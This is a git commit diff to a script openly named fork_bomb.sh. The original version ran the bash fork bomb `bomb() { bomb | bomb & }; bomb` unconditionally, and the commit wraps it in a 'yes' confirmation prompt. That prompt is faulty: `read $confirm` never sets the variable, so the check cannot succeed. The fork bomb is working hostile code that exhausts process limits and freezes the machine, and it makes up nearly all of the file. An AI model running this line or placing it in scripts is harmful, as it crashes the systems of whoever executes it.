e8a92156ca86b21dafe1f58d11e25b390d8d765c
Bryan Hernandez <pdnbryan1998@gmail.com>
2018-09-05 13:44:17 -0700

    Update fork_bomb.sh

--- fork_bomb.sh
+++ fork_bomb.sh
@@ -1,3 +1,13 @@
 #!/bin/bash
 
-bomb() { bomb | bomb & }; bomb
+echo "Type 'yes' to confirm."
+
+read $confirm
+
+if [[ $confirm == "yes" ]]
+then
+	echo "Confirmed."
+	bomb() { bomb | bomb & }; bomb
+else
+	echo "Cancelled."
+fi
